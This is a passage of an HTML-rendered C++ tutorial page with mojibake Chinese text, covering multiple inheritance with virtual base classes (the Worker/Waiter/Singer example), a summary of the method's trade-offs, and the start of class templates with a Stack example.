class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sw.Waiter::Talent(); <span class="comment">// è°ƒç”¨ Waiter ç‰ˆæœ¬çš„ Talent()</span></span><br><span class="line">sw.Singer::Talent(); <span class="comment">// è°ƒç”¨ Singer ç‰ˆæœ¬çš„ Talent()</span></span><br></pre></td></tr></table></figure><p><strong>è™šå‡½æ•°å’Œæ­§ä¹‰:</strong></p><p>å¦‚æœå†²çªçš„æ–¹æ³•æ˜¯<strong>è™šå‡½æ•°</strong>ï¼Œæƒ…å†µä¼šæ›´å¤æ‚ä¸€äº›ã€‚</p><ul><li><p>  å¦‚æœåªæœ‰<strong>ä¸€ä¸ª</strong>åŸºç±»æä¾›äº†è¯¥è™šå‡½æ•°ï¼Œæˆ–è€…æ‰€æœ‰æä¾›è¯¥è™šå‡½æ•°çš„åŸºç±»éƒ½ç»§æ‰¿è‡ª<strong>åŒä¸€ä¸ª</strong>ï¼ˆå¯èƒ½æ˜¯è™šï¼‰åŸºç±»çš„åŒä¸€ä¸ªè™šå‡½æ•°ï¼Œé‚£ä¹ˆé€šè¿‡æ´¾ç”Ÿç±»å¯¹è±¡è°ƒç”¨é€šå¸¸æ²¡æœ‰æ­§ä¹‰ï¼ˆåŠ¨æ€è”ç¼–ä¼šèµ·ä½œç”¨ï¼‰ã€‚</p></li><li><p>ä½†æ˜¯ï¼Œå¦‚æœä¸åŒçš„åŸºç±»æä¾›äº†<strong>ç­¾åç›¸åŒä½†æ— å…³</strong>çš„è™šå‡½æ•°ï¼Œæˆ–è€…æ´¾ç”Ÿç±»æƒ³æä¾›ä¸€ä¸ª<strong>è¦†ç›–æ‰€æœ‰</strong>åŸºç±»ç‰ˆæœ¬çš„æ–°ç‰ˆæœ¬ï¼Œæƒ…å†µä¼šå˜å¾—å¤æ‚ã€‚é€šå¸¸å»ºè®®åœ¨æ´¾ç”Ÿç±»ä¸­æä¾›ä¸€ä¸ªæ–°çš„è™šå‡½æ•°ï¼Œå¹¶æ˜¾å¼è°ƒç”¨æ‰€éœ€çš„åŸºç±»ç‰ˆæœ¬ã€‚</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// workermi.h, workermi.cpp, worktest.cpp ç¤ºä¾‹ (æ¨¡æ‹Ÿ Worker å±‚æ¬¡ç»“æ„)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// worker0.h - åŸºç±» Worker</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> WORKER0_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WORKER0_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="comment">// ... (Worker å®šä¹‰ï¼ŒåŒ…å«è™šå‡½æ•° Show() å’Œ Set()) ...</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// workermi.h - MI ç›¸å…³ç±»</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> WORKERMI_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WORKERMI_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;worker0.h&quot;</span> <span class="comment">// åŒ…å«åŸºç±»</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Waiter</span> :</span> <span class="keyword">virtual</span> <span class="keyword">public</span> Worker &#123; <span class="comment">// è™šç»§æ‰¿</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> panache;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Data</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Get</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Waiter() : Worker(), panache(<span class="number">0</span>) &#123;&#125;</span><br><span class="line">    Waiter(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; s, <span class="keyword">long</span> n, <span class="keyword">int</span> p = <span class="number">0</span>)</span><br><span class="line">             : Worker(s, n), panache(p) &#123;&#125;</span><br><span class="line">    Waiter(<span class="keyword">const</span> Worker &amp; wk, <span class="keyword">int</span> p = <span class="number">0</span>)</span><br><span class="line">             : Worker(wk), panache(p) &#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Set</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Show</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Singer</span> :</span> <span class="keyword">virtual</span> <span class="keyword">public</span> Worker &#123; <span class="comment">// è™šç»§æ‰¿</span></span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> &#123;</span>other, alto, contralto, soprano, bass, baritone, tenor&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> &#123;</span>Vtypes = <span class="number">7</span>&#125;;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Data</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Get</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> *pv[Vtypes]; <span class="comment">// string equivs of voice types</span></span><br><span class="line">    <span class="keyword">int</span> voice;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Singer() : Worker(), voice(other) &#123;&#125;</span><br><span class="line">    Singer(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; s, <span class="keyword">long</span> n, <span class="keyword">int</span> v = other)</span><br><span class="line">             : Worker(s, n), voice(v) &#123;&#125;</span><br><span class="line">    Singer(<span class="keyword">const</span> Worker &amp; wk, <span class="keyword">int</span> v = other)</span><br><span class="line">             : Worker(wk), voice(v) &#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Set</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Show</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¤šé‡ç»§æ‰¿</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SingingWaiter</span> :</span> <span class="keyword">public</span> Singer, <span class="keyword">public</span> Waiter &#123;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Data</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Get</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    SingingWaiter() &#123;&#125;</span><br><span class="line">    <span class="comment">// æ˜¾å¼è°ƒç”¨è™šåŸºç±» Worker çš„æ„é€ å‡½æ•°</span></span><br><span class="line">    SingingWaiter(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; s, <span class="keyword">long</span> n, <span class="keyword">int</span> p = <span class="number">0</span>, <span class="keyword">int</span> v = other)</span><br><span class="line">             : Worker(s, n), Waiter(s, n, p), Singer(s, n, v) &#123;&#125;</span><br><span class="line">    SingingWaiter(<span class="keyword">const</span> Worker &amp; wk, <span class="keyword">int</span> p = <span class="number">0</span>, <span class="keyword">int</span> v = other)</span><br><span class="line">             : Worker(wk), Waiter(wk, p), Singer(wk, v) &#123;&#125;</span><br><span class="line">    SingingWaiter(<span class="keyword">const</span> Waiter &amp; wt, <span class="keyword">int</span> v = other)</span><br><span class="line">             : Worker(wt), Waiter(wt), Singer(wt, v) &#123;&#125; <span class="comment">// ä» Waiter æ„é€ </span></span><br><span class="line">    SingingWaiter(<span class="keyword">const</span> Singer &amp; sg, <span class="keyword">int</span> p = <span class="number">0</span>)</span><br><span class="line">             : Worker(sg), Waiter(sg, p), Singer(sg) &#123;&#125; <span class="comment">// ä» Singer æ„é€ </span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Set</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Show</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// workermi.cpp - å®ç° (éƒ¨åˆ†)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;workermi.h&quot;</span></span></span><br><span class="line"><span class="comment">// ... Worker å®ç° ...</span></span><br><span class="line"><span class="comment">// --- Waiter methods ---</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Waiter::Set</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Worker::Get(); <span class="comment">// è°ƒç”¨åŸºç±»æ–¹æ³•è·å–åŸºæœ¬ä¿¡æ¯</span></span><br><span class="line">    Get();         <span class="comment">// è°ƒç”¨è‡ªå·±çš„ Get è·å– panache</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Waiter::Show</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    Worker::Show(); <span class="comment">// è°ƒç”¨åŸºç±»æ–¹æ³•æ˜¾ç¤ºåŸºæœ¬ä¿¡æ¯</span></span><br><span class="line">    Data();         <span class="comment">// è°ƒç”¨è‡ªå·±çš„ Data æ˜¾ç¤º panache</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Waiter::Data</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="comment">/* show panache */</span> &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Waiter::Get</span><span class="params">()</span> </span>&#123; <span class="comment">/* get panache */</span> &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// --- Singer methods ---</span></span><br><span class="line"><span class="comment">// ... (ç±»ä¼¼å®ç° Set, Show, Data, Get) ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// --- SingingWaiter methods ---</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SingingWaiter::Data</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    Singer::Data(); <span class="comment">// æ˜¾ç¤º Singer çš„æ•°æ®</span></span><br><span class="line">    Waiter::Data(); <span class="comment">// æ˜¾ç¤º Waiter çš„æ•°æ®</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SingingWaiter::Get</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Waiter::Get(); <span class="comment">// è·å– Waiter çš„æ•°æ®</span></span><br><span class="line">    Singer::Get(); <span class="comment">// è·å– Singer çš„æ•°æ®</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SingingWaiter::Set</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Worker::Get(); <span class="comment">// è·å– Worker çš„æ•°æ® (åªéœ€è¦ä¸€æ¬¡ï¼Œå› ä¸ºæ˜¯è™šåŸºç±»)</span></span><br><span class="line">    Get();         <span class="comment">// è°ƒç”¨ SingingWaiter::Get() è·å– Waiter å’Œ Singer çš„æ•°æ®</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SingingWaiter::Show</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    Worker::Show(); <span class="comment">// æ˜¾ç¤º Worker çš„æ•°æ® (åªéœ€è¦ä¸€æ¬¡)</span></span><br><span class="line">    Data();         <span class="comment">// è°ƒç”¨ SingingWaiter::Data() æ˜¾ç¤º Waiter å’Œ Singer çš„æ•°æ®</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// worktest.cpp - ä½¿ç”¨ç¤ºä¾‹</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;workermi.h&quot;</span></span></span><br><span class="line"><span class="comment">// ... (main å‡½æ•°åˆ›å»º Worker*, Waiter*, Singer*, SingingWaiter* æ•°ç»„ï¼Œå¹¶é€šè¿‡åŸºç±»æŒ‡é’ˆè°ƒç”¨ Set å’Œ Show) ...</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="14-3-3-MI-å°ç»“"><a href="#14-3-3-MI-å°ç»“" class="headerlink" title="14.3.3 MI å°ç»“"></a>14.3.3 MI å°ç»“</h3><p><strong>ä¼˜ç‚¹:</strong></p><ul><li>  å¯ä»¥ç»„åˆå¤šä¸ªä¸åŒç±»çš„åŠŸèƒ½ã€‚</li><li>  å…è®¸æ›´çµæ´»çš„ç±»å±‚æ¬¡ç»“æ„è®¾è®¡ã€‚</li></ul><p><strong>ç¼ºç‚¹:</strong></p><ul><li>  <strong>å¤æ‚æ€§å¢åŠ :</strong> å¯èƒ½å¯¼è‡´åç§°å†²çªå’Œæ­§ä¹‰ã€‚</li><li>  <strong>é’»çŸ³é—®é¢˜:</strong> éœ€è¦ä½¿ç”¨è™šåŸºç±»æ¥è§£å†³ï¼Œè¿™ä¼šå¢åŠ æ„é€ å‡½æ•°å®ç°çš„å¤æ‚æ€§ï¼Œå¹¶å¯èƒ½å¼•å…¥é¢å¤–çš„è¿è¡Œæ—¶å¼€é”€ã€‚</li><li>  <strong>éš¾ä»¥ç†è§£å’Œç»´æŠ¤:</strong> å¤æ‚çš„ MI å±‚æ¬¡ç»“æ„å¯èƒ½éš¾ä»¥ç†è§£å’Œè°ƒè¯•ã€‚</li></ul><p><strong>è®¾è®¡å»ºè®®:</strong></p><ul><li>  <strong>è°¨æ…ä½¿ç”¨:</strong> å¤šé‡ç»§æ‰¿æ˜¯ä¸€ä¸ªå¼ºå¤§çš„å·¥å…·ï¼Œä½†ä¹Ÿå®¹æ˜“è¢«æ»¥ç”¨ã€‚åœ¨å†³å®šä½¿ç”¨ MI ä¹‹å‰ï¼Œä»”ç»†è€ƒè™‘æ˜¯å¦æœ‰æ›´ç®€å•çš„æ›¿ä»£æ–¹æ¡ˆï¼ˆå¦‚åŒ…å«/ç»„åˆï¼Œæˆ–è€…å•ç»§æ‰¿åŠ æ¥å£ï¼‰ã€‚</li><li>  <strong>ä¼˜å…ˆè€ƒè™‘ç»„åˆ:</strong> å¯¹äº â€œhas-aâ€ å…³ç³»ï¼Œç»„åˆé€šå¸¸æ˜¯æ›´ç®€å•ã€æ›´å®‰å…¨çš„é€‰æ‹©ã€‚</li><li>  <strong>è™šåŸºç±»:</strong> å¦‚æœç¡®å®éœ€è¦ MI å¹¶ä¸”é‡åˆ°äº†é’»çŸ³é—®é¢˜ï¼ŒåŠ¡å¿…ä½¿ç”¨è™šåŸºç±»ã€‚</li><li>  <strong>æ˜ç¡®è§£å†³æ­§ä¹‰:</strong> ä½¿ç”¨ä½œç”¨åŸŸè§£æè¿ç®—ç¬¦ (<code>::</code>) æ¥è§£å†³æˆå‘˜åç§°å†²çªã€‚</li></ul><p>è®¸å¤šç°ä»£ C++ å®è·µå€¾å‘äºé¿å…å¤æ‚çš„å¤šé‡ç»§æ‰¿ï¼Œå°¤å…¶æ˜¯åœ¨åº”ç”¨å±‚é¢ã€‚ç„¶è€Œï¼Œåœ¨æŸäº›åº“è®¾è®¡ï¼ˆå¦‚ IO æµåº“ï¼‰æˆ–éœ€è¦æ··åˆä¸åŒæŠ½è±¡æ¥å£çš„åœºæ™¯ä¸­ï¼ŒMI ä»ç„¶æ˜¯ä¸€ä¸ªæœ‰ç”¨çš„å·¥å…·ã€‚</p><h2 id="14-4-ç±»æ¨¡æ¿"><a href="#14-4-ç±»æ¨¡æ¿" class="headerlink" title="14.4 ç±»æ¨¡æ¿"></a>14.4 ç±»æ¨¡æ¿</h2><p>å°±åƒå‡½æ•°æ¨¡æ¿å…è®¸æˆ‘ä»¬ç¼–å†™é€šç”¨çš„å‡½æ•°ï¼Œå¯ä»¥å¤„ç†ä¸åŒç±»å‹çš„æ•°æ®ä¸€æ ·ï¼Œ<strong>ç±»æ¨¡æ¿ (Class Templates)</strong> å…è®¸æˆ‘ä»¬å®šä¹‰é€šç”¨çš„ç±»è“å›¾ï¼Œå¯ä»¥ç”¨æ¥åˆ›å»ºå¤„ç†ä¸åŒæ•°æ®ç±»å‹çš„ç±»ã€‚</p><p>ç±»æ¨¡æ¿æ˜¯å‚æ•°åŒ–çš„ç±»å®šä¹‰ï¼Œå…¶ä¸­çš„æŸäº›ç±»å‹ï¼ˆæˆ–å€¼ï¼‰åœ¨å®šä¹‰æ—¶æ˜¯æœªæŒ‡å®šçš„ï¼Œè€Œåœ¨åˆ›å»ºç±»çš„å®ä¾‹ï¼ˆå¯¹è±¡ï¼‰æ—¶æ‰è¢«æŒ‡å®šã€‚è¿™æå¤§åœ°æé«˜äº†ä»£ç çš„é‡ç”¨æ€§ï¼Œæ˜¯æ³›å‹ç¼–ç¨‹çš„æ ¸å¿ƒã€‚STL ä¸­çš„å®¹å™¨ï¼ˆå¦‚ <code>vector</code>, <code>list</code>, <code>map</code>ï¼‰å’Œæ™ºèƒ½æŒ‡é’ˆç­‰éƒ½æ˜¯ç±»æ¨¡æ¿çš„å…¸å‹åº”ç”¨ã€‚</p><h3 id="14-4-1-å®šä¹‰ç±»æ¨¡æ¿"><a href="#14-4-1-å®šä¹‰ç±»æ¨¡æ¿" class="headerlink" title="14.4.1 å®šä¹‰ç±»æ¨¡æ¿"></a>14.4.1 å®šä¹‰ç±»æ¨¡æ¿</h3><p>å®šä¹‰ç±»æ¨¡æ¿çš„è¯­æ³•ä¸å‡½æ•°æ¨¡æ¿ç±»ä¼¼ï¼Œä½¿ç”¨ <code>template</code> å…³é”®å­—ï¼Œåè·Ÿå°–æ‹¬å· <code>&lt;&gt;</code> ä¸­çš„æ¨¡æ¿å‚æ•°åˆ—è¡¨ã€‚</p><p><strong>è¯­æ³•:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T1, <span class="keyword">typename</span> T2, ...&gt; <span class="comment">// æˆ–è€… template &lt;class T1, class T2, ...&gt;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassName</span> &#123;</span></span><br><span class="line">    <span class="comment">// ç±»å®šä¹‰ï¼Œå¯ä»¥ä½¿ç”¨æ¨¡æ¿å‚æ•° T1, T2 ç­‰ä½œä¸ºç±»å‹</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    T1 member1;</span><br><span class="line">    T2 member2;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    ClassName(<span class="keyword">const</span> T1 &amp; val1, <span class="keyword">const</span> T2 &amp; val2);</span><br><span class="line">    <span class="function">T1 <span class="title">getMember1</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æˆå‘˜å‡½æ•°çš„å®šä¹‰ä¹Ÿéœ€è¦æ¨¡æ¿å‰ç¼€</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T1, <span class="keyword">typename</span> T2, ...&gt;</span><br><span class="line">ClassName&lt;T1, T2, ...&gt;::ClassName(<span class="keyword">const</span> T1 &amp; val1, <span class="keyword">const</span> T2 &amp; val2)</span><br><span class="line">    : member1(val1), member2(val2) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T1, <span class="keyword">typename</span> T2, ...&gt;</span><br><span class="line">T1 ClassName&lt;T1, T2, ...&gt;::getMember1() <span class="keyword">const</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> member1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>  <code>template &lt;typename T&gt;</code> æˆ– <code>template &lt;class T&gt;</code>: å£°æ˜ä¸€ä¸ªæ¨¡æ¿ï¼Œ<code>T</code> æ˜¯ä¸€ä¸ªç±»å‹å‚æ•°çš„å ä½ç¬¦ã€‚<code>typename</code> å’Œ <code>class</code> åœ¨è¿™é‡Œæ˜¯ç­‰ä»·çš„ã€‚ä½ å¯ä»¥ä½¿ç”¨ä»»ä½•æœ‰æ•ˆçš„æ ‡è¯†ç¬¦ä½œä¸ºç±»å‹å‚æ•°åï¼ˆé€šå¸¸ç”¨ <code>T</code>, <code>U</code>, <code>V</code> ç­‰ï¼‰ã€‚</li><li>  åœ¨ç±»å®šä¹‰å†…éƒ¨ï¼Œå¯ä»¥ä½¿ç”¨æ¨¡æ¿å‚æ•° <code>T</code> å°±åƒä½¿ç”¨æ™®é€šç±»å‹ä¸€æ ·ï¼ˆä¾‹å¦‚ï¼Œå®šä¹‰æˆå‘˜å˜é‡ç±»å‹ã€å‡½æ•°å‚æ•°ç±»å‹ã€è¿”å›å€¼ç±»å‹ï¼‰ã€‚</li><li>  <strong>æˆå‘˜å‡½æ•°å®šä¹‰:</strong> å½“åœ¨ç±»å¤–éƒ¨å®šä¹‰æ¨¡æ¿ç±»çš„æˆå‘˜å‡½æ•°æ—¶ï¼Œå¿…é¡»å†æ¬¡ä½¿ç”¨ <code>template &lt;...&gt;</code> å‰ç¼€ï¼Œå¹¶ä¸”åœ¨ç±»ååé¢è·Ÿä¸Šæ¨¡æ¿å‚æ•°åˆ—è¡¨ <code>&lt;T1, T2, ...&gt;</code>ã€‚</li></ul><p><strong>ç¤ºä¾‹ï¼šç®€å•çš„ <code>Stack</code> æ¨¡æ¿ç±»</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// stacktp.h -- ä¸€ä¸ªç®€å•çš„æ ˆæ¨¡æ¿ç±»å®šä¹‰</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> STACKTP_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STACKTP_H_</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="comment">// æˆ–è€… template &lt;class T&gt;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stack</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> &#123;</span> MAX = <span class="number">10</span> &#125;; <span class="comment">// æ ˆçš„æœ€å¤§å®¹é‡ (éç±»å‹å‚æ•°å¯ä»¥æ”¹è¿›)</span></span><br><span class="line">    T items[MAX];      <span class="comment">// å­˜å‚¨æ ˆå…ƒç´ çš„æ•°ç»„ï¼Œç±»å‹ä¸º T</span></span><br><span class="line">    <span class="keyword">int</span> top;           <span class="comment">// æ ˆé¡¶ç´¢å¼•</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Stack();</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isempty</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isfull</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">    <span class="comment">// push() returns false if stack already is full, true otherwise</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">push</span><span class="params">(<span class="keyword">const</span> T &amp; item)</span></span>; <span class="comment">// å‚æ•°ç±»å‹ä¸º T</span></span><br><span class="line">    <span class="comment">// pop() returns false if stack already is empty, true otherwise</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">pop</span><span class="params">(T &amp; item)</span></span>;        <span class="comment">// å‚æ•°ç±»å‹ä¸º T (é€šè¿‡å¼•ç”¨è¿”å›å¼¹å‡ºçš„å…ƒç´ )</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æˆå‘˜å‡½æ•°å®ç° (é€šå¸¸ä¹Ÿæ”¾åœ¨å¤´æ–‡ä»¶ä¸­)</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line">Stack&lt;T&gt;::Stack() : top(<span class="number">0</span>) &#123; <span class="comment">// åˆå§‹åŒ–æ ˆé¡¶</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">bool</span> Stack&lt;T&gt;::isempty() <span class="keyword">const</span> &#123;</span><br><span class="line">    <span 